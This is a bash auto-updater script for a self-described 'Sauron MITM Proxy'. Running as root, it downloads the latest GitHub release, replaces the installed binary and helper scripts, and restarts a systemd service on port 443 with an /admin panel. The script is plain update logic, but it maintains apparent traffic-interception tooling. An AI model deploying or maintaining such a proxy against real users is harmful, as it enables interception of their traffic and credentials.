#!/bin/bash
set -e

echo "🔄 Sauron Auto-Updater"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root (use sudo)"
   exit 1
fi

# Function to get current installed version
get_current_version() {
    if [ -f "/usr/local/bin/sauron" ]; then
        # Extract version from "Sauron MITM Proxy <version>" output
        /usr/local/bin/sauron --version 2>/dev/null | sed -n 's/Sauron MITM Proxy \(.*\)/\1/p' | tr -d '\n' || echo "unknown"
    else
        echo "not-installed"
    fi
}

# Function to get latest GitHub release version
get_latest_version() {
    curl -s "https://api.github.com/repos/Skillz147/Sauron-Pro/releases/latest" | \
    grep '"tag_name":' | \
    sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null || echo "unknown"
}

# Function to download and extract latest release
download_latest_release() {
    local version="$1"
    local temp_dir="/tmp/sauron-update-$$"
    
    echo "📥 Downloading Sauron $version..." >&2
    mkdir -p "$temp_dir"
    cd "$temp_dir"
    
    # Download latest release
    if ! wget -q "https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"; then
        echo "❌ Failed to download release" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "📦 Extracting release..." >&2
    if ! tar -xzf sauron-linux-amd64.tar.gz; then
        echo "❌ Failed to extract release" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    # Check if binary exists in extracted files
    if [ ! -f "sauron/sauron" ]; then
        echo "❌ Binary not found in release package" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "$temp_dir/sauron"
}

# Check for force flag
FORCE_UPDATE=false
if [ "$1" = "--force" ] || [ "$1" = "force" ]; then
    FORCE_UPDATE=true
    echo "🔄 Force update mode enabled"
fi

# Check for updates mode
if [ "$1" = "--check" ] || [ "$1" = "check" ]; then
    echo "🔍 Checking for updates..."
    
    current_version=$(get_current_version)
    latest_version=$(get_latest_version)
    
    echo "📊 Current version: $current_version"
    echo "📊 Latest version:  $latest_version"
    
    if [ "$current_version" = "$latest_version" ]; then
        echo "✅ You have the latest version!"
        exit 0
    elif [ "$latest_version" = "unknown" ]; then
        echo "⚠️  Unable to check for updates (network issue?)"
        exit 1
    else
        echo "🆕 Update available: $current_version → $latest_version"
        echo ""
        echo "Run 'sudo ./update-sauron.sh' to update automatically"
        exit 0
    fi
fi

# Auto-update mode (default)
echo "🔍 Checking for updates..."

current_version=$(get_current_version)
latest_version=$(get_latest_version)

echo "📊 Current version: $current_version"
echo "📊 Latest version:  $latest_version"

# Check if we're running from within the extracted directory (manual update)
if [ -f "./sauron" ] && [ "$FORCE_UPDATE" = false ]; then
    echo "📱 Using binary from current directory..."
    binary_source="./sauron"
    
    # When using local binary, get the version from it directly
    local_version=$(./sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
    echo "📊 Local binary version: $local_version"
    
    # Skip version comparison for local updates
    echo "ℹ️  Performing manual update with local binary..."
else
    if [ "$FORCE_UPDATE" = true ]; then
        echo "🔄 Force mode: Downloading latest version regardless of local binary"
    fi
    
    # Check if update is needed (unless force mode)
    if [ "$current_version" = "$latest_version" ] && [ "$latest_version" != "unknown" ] && [ "$FORCE_UPDATE" = false ]; then
        echo "✅ Already running the latest version ($current_version)"
        echo "🔍 Check status: systemctl status sauron"
        echo "💡 Use --force to reinstall anyway"
        exit 0
    fi

    if [ "$latest_version" = "unknown" ]; then
        echo "⚠️  Unable to fetch latest version from GitHub"
        echo "📋 Manual update steps:"
        echo "   1. Download: wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"
        echo "   2. Extract: tar -xzf sauron-linux-amd64.tar.gz"
        echo "   3. Update: cd sauron && sudo ./update-sauron.sh"
        exit 1
    fi

    # Auto-download mode
    echo "🆕 Update available: $current_version → $latest_version"
    echo "📥 Downloading latest release automatically..."
    
    download_dir=$(download_latest_release "$latest_version")
    binary_source="$download_dir/sauron"
    
    # Cleanup function
    cleanup() {
        if [ -n "$download_dir" ] && [ -d "$download_dir" ]; then
            rm -rf "$download_dir"
        fi
    }
    trap cleanup EXIT
fi

# Stop service gracefully
echo "⏹️  Stopping Sauron service..."
if systemctl is-active sauron.service >/dev/null 2>&1; then
    if systemctl stop sauron.service; then
        echo "✅ Service stopped gracefully"
    else
        echo "⚠️ Graceful stop failed, forcing stop..."
        systemctl kill sauron.service 2>/dev/null || true
        sleep 2
        echo "🔄 Force stop completed"
    fi
    
    # Wait for port 443 to be free
    timeout=10
    while netstat -tlnp 2>/dev/null | grep -q ":443 " && [ $timeout -gt 0 ]; do
        echo "⏳ Waiting for port 443 to be free... ($timeout seconds left)"
        sleep 1
        ((timeout--))
    done
    
    if netstat -tlnp 2>/dev/null | grep -q ":443 "; then
        echo "⚠️ Port 443 still in use, but continuing..."
    else
        echo "✅ Port 443 is now free"
    fi
else
    echo "ℹ️  Service was not running"
fi

# Backup current binary
if [ -f "/usr/local/bin/sauron" ]; then
    backup_file="/usr/local/bin/sauron.backup.$(date +%Y%m%d_%H%M%S)"
    echo "💾 Backing up current binary to $backup_file"
    cp /usr/local/bin/sauron "$backup_file"
fi

# Install new binary
echo "📦 Installing new binary..."
cp "$binary_source" /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# Detect what type of update this is
update_type=""
has_binary=false
has_scripts=false

if [ -f "$binary_source" ]; then
    has_binary=true
fi

# Check for scripts in source directory
source_dir=""
if [ "$binary_source" = "./sauron" ]; then
    source_dir="$(pwd)"
else
    source_dir=$(dirname "$binary_source")
fi

script_count=$(find "$source_dir" -maxdepth 1 -name "*.sh" -type f 2>/dev/null | wc -l)
if [ $script_count -gt 0 ]; then
    has_scripts=true
fi

# Determine update type
if [ "$has_binary" = true ] && [ "$has_scripts" = true ]; then
    update_type="🔄 Full update (binary + scripts)"
elif [ "$has_binary" = true ] && [ "$has_scripts" = false ]; then
    update_type="🔧 Binary-only update"
elif [ "$has_binary" = false ] && [ "$has_scripts" = true ]; then
    update_type="📜 Scripts-only update"
else
    update_type="❓ Unknown update type"
fi

echo "$update_type"

# Update supporting scripts if they exist in the release
echo "🔧 Detecting and updating available scripts..."
script_update_count=0

# Determine source directory
if [ "$binary_source" = "./sauron" ]; then
    source_dir="$(pwd)"
    echo "  📁 Scanning for scripts in: $source_dir"
else
    source_dir=$(dirname "$binary_source")
    echo "  📁 Scanning for scripts in: $source_dir"
fi

# Dynamically find all .sh scripts in source directory
available_scripts=()
if [ -d "$source_dir" ]; then
    while IFS= read -r -d '' script_path; do
        script_name=$(basename "$script_path")
        # Skip the current update script to avoid self-overwrite issues
        if [ "$script_name" != "$(basename "$0")" ] && [ "$script_name" != "update-sauron-template.sh" ]; then
            available_scripts+=("$script_name")
        fi
    done < <(find "$source_dir" -maxdepth 1 -name "*.sh" -type f -print0 2>/dev/null)
fi

if [ ${#available_scripts[@]} -eq 0 ]; then
    echo "  ℹ️  No shell scripts found in source directory"
else
    echo "  🔍 Found ${#available_scripts[@]} script(s): ${available_scripts[*]}"
    
    for script in "${available_scripts[@]}"; do
        source_script="$source_dir/$script"
        
        if [ -f "$source_script" ]; then
            # Detect current sauron installation directory
            SAURON_DIR=""
            
            # Check if we're in a sauron directory
            if [[ "$(basename $(pwd))" == "sauron" ]] || [[ -f "./sauron" ]] || [[ -f "./.env" ]]; then
                SAURON_DIR="$(pwd)"
            # Check common sauron installation paths
            elif [[ -d "/root/sauron" ]] && [[ -f "/root/sauron/sauron" || -f "/root/sauron/.env" ]]; then
                SAURON_DIR="/root/sauron"
            elif [[ -d "/home/sauron" ]] && [[ -f "/home/sauron/sauron" || -f "/home/sauron/.env" ]]; then
                SAURON_DIR="/home/sauron"
            elif [[ -d "/opt/sauron" ]] && [[ -f "/opt/sauron/sauron" || -f "/opt/sauron/.env" ]]; then
                SAURON_DIR="/opt/sauron"
            else
                # Fallback to current directory
                SAURON_DIR="$(pwd)"
            fi
            
            # Try to copy to detected sauron directory
            if cp "$source_script" "$SAURON_DIR/$script" 2>/dev/null && chmod +x "$SAURON_DIR/$script" 2>/dev/null; then
                echo "  ✅ Updated $script (in $SAURON_DIR)"
                ((script_update_count++))
            else
                echo "  ⚠️  Failed to update $script"
            fi
        fi
    done
fi

if [ $script_update_count -eq 0 ]; then
    if [ "$has_scripts" = true ]; then
        echo "  ⚠️  Scripts were available but none were updated successfully"
    else
        echo "  ℹ️  No scripts were available to update"
    fi
else
    echo "  📜 Successfully updated $script_update_count script(s)"
fi

# Summary of what was updated
echo ""
echo "📋 Update Summary:"
echo "  🔧 Binary: $([ "$has_binary" = true ] && echo "✅ Updated" || echo "❌ Not available")"
echo "  📜 Scripts: $([ $script_update_count -gt 0 ] && echo "✅ Updated $script_update_count" || echo "$([ "$has_scripts" = true ] && echo "⚠️ Available but failed" || echo "❌ None available")")"

# Verify installation
new_version=$(/usr/local/bin/sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
echo "✅ Installed version: $new_version"

# Restart service
echo "🚀 Restarting Sauron service..."
if systemctl restart sauron.service; then
    echo "✅ Service restart command executed"
else
    echo "⚠️ Service restart command failed, trying alternative approach..."
    systemctl stop sauron.service 2>/dev/null || true
    sleep 1
    systemctl start sauron.service
fi

# Wait a moment and check status
sleep 3
if systemctl is-active sauron.service >/dev/null 2>&1; then
    echo "✅ Sauron updated successfully!"
    echo "📊 Updated: $current_version → $new_version"
    
    # Double-check it's actually responding
    if curl -k -s --connect-timeout 5 https://localhost/admin > /dev/null 2>&1; then
        echo "🌐 Service is responding to HTTP requests"
    else
        echo "⚠️ Service is running but may not be responding to requests"
    fi
else
    echo "❌ Service failed to start!"
    echo "🔍 Service status:"
    systemctl status sauron.service --no-pager -l
    echo ""
    echo "🔍 Recent logs:"
    journalctl -u sauron --no-pager -l -n 10
    exit 1
fi

echo ""
echo "🎯 Update Complete!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Status: systemctl status sauron"
echo "📋 Logs:   sudo journalctl -u sauron -f"
echo "🌐 Access: https://$(hostname -f)/admin"
